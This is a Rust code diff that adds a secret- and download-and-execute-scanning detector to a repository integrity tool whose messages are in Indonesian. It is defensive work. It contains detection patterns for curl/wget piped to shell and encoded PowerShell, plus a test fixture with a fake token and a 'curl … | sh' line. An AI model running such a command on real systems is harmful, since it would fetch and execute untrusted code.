@@ -2,9 +2,9 @@ use std::{fs, path::{Path, PathBuf}, process::Command};
 
 #[derive(Debug)]
 struct Finding { detector: &'static str, rule: &'static str, severity: &'static str, path: String, line: usize, summary: String, evidence: String, fix: String }
-const DETECTORS: &[&str] = &["revision-integrity","path-integrity","file-integrity","markdown-links","markdown-structure","workflow-integrity","contract-drift","artifact-integrity"];
+const DETECTORS: &[&str] = &["revision-integrity","path-integrity","file-integrity","markdown-links","markdown-structure","workflow-integrity","contract-drift","artifact-integrity","security-patterns"];
 fn selected(scope: &str) -> Option<Vec<&'static str>> { Some(match scope {
-    "all" => DETECTORS.to_vec(), "sha" => vec!["revision-integrity"], "workflow" => vec!["workflow-integrity"],
+    "all" => DETECTORS.to_vec(), "security" => vec!["security-patterns"], "sha" => vec!["revision-integrity"], "workflow" => vec!["workflow-integrity"],
     "structure" => vec!["path-integrity","file-integrity","contract-drift"],
     "documentation" => vec!["markdown-links","markdown-structure","file-integrity"],
     "artifacts" => vec!["artifact-integrity","revision-integrity"], "contracts" => vec!["contract-drift","file-integrity"],
@@ -40,6 +40,37 @@ fn scan(root:&Path,scope:&str,expected:Option<&str>)->Result<(Vec<Finding>,Vec<&
  }}
  if run.contains(&"workflow-integrity"){for p in &all{let rp=rel(&root,p);if !rp.starts_with(".github/workflows/")||!matches!(p.extension().and_then(|v|v.to_str()),Some("yml"|"yaml")){continue;}let Ok(t)=fs::read_to_string(p)else{continue};if !t.lines().any(|l|l.trim_start().starts_with("name:")){out.push(finding("workflow-integrity","workflow-name-missing","medium",rp.clone(),1,"Workflow tidak memiliki name yang terlihat.","name: tidak ditemukan","Tambahkan nama workflow eksplisit."));}for(i,line)in t.lines().enumerate(){if let Some(target)=line.trim().strip_prefix("uses: ./"){let target=target.split_whitespace().next().unwrap_or(target);if !root.join(target).exists(){out.push(finding("workflow-integrity","local-action-missing","high",rp.clone(),i+1,"Local action tidak ditemukan.",target,"Pulihkan action atau perbaiki referensi."));}}}}}
  if run.contains(&"contract-drift"){let r=fs::read_to_string(root.join("README.md")).unwrap_or_default();for c in ["one buat","one periksa","one jalankan","one test","one bangun","one package","one version","one help"]{if !r.contains(c){out.push(finding("contract-drift","cli-doc-command-missing","medium","README.md".into(),0,"Dokumentasi tidak memuat perintah CLI inti.",c,"Selaraskan README dengan kontrak CLI."));}}}
+
+ if run.contains(&"security-patterns"){for p in &all{
+  let rp=rel(&root,p);
+  let ext=p.extension().and_then(|v|v.to_str()).unwrap_or("");
+  if !matches!(ext, "rs"|"one"|"py"|"js"|"ts"|"jsx"|"tsx"|"sh"|"ps1"|"yml"|"yaml"|"toml"|"json"|"md"|"txt"|"env"|"cfg"|"ini"|"go"|"java"|"c"|"h"|"cpp"|"cs"|"rb"|"php"|"pl"|"bat"|"cmd"){continue;}
+  let Ok(t)=fs::read_to_string(p) else {continue};
+  for (i,line) in t.lines().enumerate(){
+   let lower=line.to_ascii_lowercase();
+   let trimmed=line.trim();
+   let private_key=trimmed.contains("-----BEGIN ") && trimmed.contains("PRIVATE KEY-----");
+   let token_prefix=["ghp_","github_pat_","gho_","ghu_","ghs_","ghr_","sk_live_","sk_test_","xoxb-","xoxp-","akia"];
+   let known_token=token_prefix.iter().any(|prefix|lower.contains(prefix));
+   let pipe_shell=(lower.contains("curl ")||lower.contains("wget ")) && (lower.contains("| sh")||lower.contains("|bash")||lower.contains("| bash")||lower.contains("|sh"));
+   let encoded_powershell=lower.contains("-encodedcommand")||lower.contains(" -enc ");
+   let workflow_write_all=rp.starts_with(".github/workflows/") && lower.contains("permissions: write-all");
+   if private_key || known_token {
+    out.push(finding("security-patterns",if private_key{"embedded-private-key"}else{"known-token-pattern"},"high",rp.clone(),i+1,"Kemungkinan kredensial rahasia tertanam; nilai disamarkan.","[REDACTED: nilai rahasia tidak ditampilkan]","Cabut/rotasi kredensial yang valid, hapus dari riwayat Git, dan gunakan secret store."));
+   } else if pipe_shell || encoded_powershell {
+    out.push(finding("security-patterns","download-and-execute-pattern","high",rp.clone(),i+1,"Pola unduh-lalu-eksekusi atau PowerShell encoded terdeteksi.","[baris berisi pola eksekusi mencurigakan disamarkan]","Tinjau sumber, konteks, dan perubahan terkait sebelum menjalankan; gunakan sumber terverifikasi."));
+   } else if workflow_write_all {
+    out.push(finding("security-patterns","workflow-write-all-permissions","medium",rp.clone(),i+1,"Workflow memberi seluruh izin token melalui write-all.","permissions: write-all","Batasi permissions ke izin minimum yang diperlukan."));
+   } else if (lower.contains("password")||lower.contains("api_key")||lower.contains("api-key")||lower.contains("access_token")||lower.contains("client_secret")||lower.contains("private_key")) && (line.contains("=")||line.contains(":")) {
+    let value=line.split_once('=').map(|x|x.1.trim()).or_else(||line.split_once(':').map(|x|x.1.trim())).unwrap_or("");
+    let cleaned=value.trim_matches(|c:char|c.is_whitespace()||c=='"'||c==','||c==';');
+    let placeholder=["your_","example","placeholder","changeme","replace_me","<","${","env(","os.environ","process.env","secrets.","null","none","xxxx"];
+    if cleaned.len()>=16 && !placeholder.iter().any(|x|cleaned.to_ascii_lowercase().contains(x)) && cleaned.bytes().any(|b|b.is_ascii_alphanumeric()) {
+     out.push(finding("security-patterns","possible-hardcoded-secret","high",rp.clone(),i+1,"Kemungkinan rahasia hardcoded; nilai sengaja tidak ditampilkan.","[REDACTED: kemungkinan kredensial]","Validasi temuan secara lokal, rotasi jika valid, dan pindahkan ke secret store."));
+    }
+   }
+  }
+ }}
  if run.contains(&"artifact-integrity")&&!root.join("Cargo.lock").is_file(){out.push(finding("artifact-integrity","cargo-lock-missing","medium","Cargo.lock".into(),0,"Cargo.lock tidak ditemukan.","lockfile hilang","Tambahkan lockfile yang sesuai toolchain."));}
  out.sort_by(|a,b|(&a.path,a.line,a.detector,a.rule).cmp(&(&b.path,b.line,b.detector,b.rule)));Ok((out,skipped,head))
 }
@@ -49,13 +80,15 @@ pub(crate) fn run(args:impl IntoIterator<Item=String>)->i32{
  "--scope"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --scope membutuhkan nilai");return 2;};scope=v;},
  "--root"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --root membutuhkan direktori");return 2;};root=PathBuf::from(v);},
  "--expected-sha"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --expected-sha membutuhkan SHA");return 2;};if v.len()!=40||!v.bytes().all(|b|b.is_ascii_hexdigit()){eprintln!("ONE-INTEGRITY: SHA harus 40 digit heksadesimal");return 2;}expected=Some(v);},
- "--help"|"-h"=>{println!("one pindai [--scope all|sha|workflow|structure|documentation|artifacts|contracts|markdown|readme] [--root DIR] [--expected-sha FULL_SHA]");return 0;},
+ "--help"|"-h"=>{println!("one pindai [--scope all|security|sha|workflow|structure|documentation|artifacts|contracts|markdown|readme] [--root DIR] [--expected-sha FULL_SHA]");return 0;},
  _=>{eprintln!("ONE-INTEGRITY: opsi tidak dikenal '{a}'");return 2;}
  }}
  match scan(&root,&scope,expected.as_deref()){Ok((findings,skipped,head))=>{println!("ONE Integrity Engine (native preview)\nroot: {}\nscope: {}\nHEAD: {}\ndetectors_run: {}\ndetectors_not_requested: {}\nfindings: {}",root.display(),scope,head.as_deref().unwrap_or("UNAVAILABLE"),selected(&scope).unwrap_or_default().join(", "),skipped.join(", "),findings.len());for f in &findings{println!("[{}] {} {}:{} [{}] {}\n  evidence: {}\n  recommendation: {}",f.severity.to_uppercase(),f.detector,f.path,f.line,f.rule,f.summary,f.evidence,f.fix);}if findings.is_empty(){println!("Tidak ada temuan pada detector yang dijalankan; detector yang tidak diminta bukan berarti lulus.");}if findings.iter().any(|f|f.severity=="critical"||f.severity=="high"){1}else{0}},Err(e)=>{eprintln!("ONE-INTEGRITY: {e}");2}}
 }
-#[cfg(test)]mod tests{use super::*;#[test]fn scopes_are_explicit_and_fail_closed(){assert_eq!(selected("sha").unwrap(),vec!["revision-integrity"]);assert!(selected("markdown").unwrap().contains(&"markdown-links"));assert!(selected("unknown").is_none());}
+#[cfg(test)]mod tests{use super::*;#[test]fn scopes_are_explicit_and_fail_closed(){assert_eq!(selected("security").unwrap(),vec!["security-patterns"]);assert_eq!(selected("sha").unwrap(),vec!["revision-integrity"]);assert!(selected("markdown").unwrap().contains(&"markdown-links"));assert!(selected("unknown").is_none());}
 #[test]fn finds_broken_markdown_link_and_unclosed_fence(){let root=std::env::temp_dir().join(format!("one-integrity-test-{}",std::process::id()));let _=fs::remove_dir_all(&root);fs::create_dir_all(&root).unwrap();fs::write(root.join("test.md"),"[broken](missing.md)\n~~~rs\ncode\n").unwrap();let(f,s,_)=scan(&root,"markdown",None).unwrap();assert!(f.iter().any(|x|x.rule=="broken-relative-link"));assert!(f.iter().any(|x|x.rule=="unclosed-code-fence"));assert!(s.contains(&"revision-integrity"));fs::remove_dir_all(root).unwrap();}
+
+#[test]fn security_scope_redacts_secret_values_and_detects_download_execution(){let root=std::env::temp_dir().join(format!("one-security-test-{}",std::process::id()));let _=fs::remove_dir_all(&root);fs::create_dir_all(&root).unwrap();fs::write(root.join("sample.sh"),"API_KEY=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\ncurl https://example.invalid/x | sh\n").unwrap();let(f,_,_)=scan(&root,"security",None).unwrap();assert!(f.iter().any(|x|x.rule=="known-token-pattern"));assert!(f.iter().any(|x|x.rule=="download-and-execute-pattern"));assert!(f.iter().all(|x|!x.evidence.contains("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")));fs::remove_dir_all(root).unwrap();}
 #[cfg(unix)]
 #[test]
 fn reports_symlink_escape_without_traversing_target(){
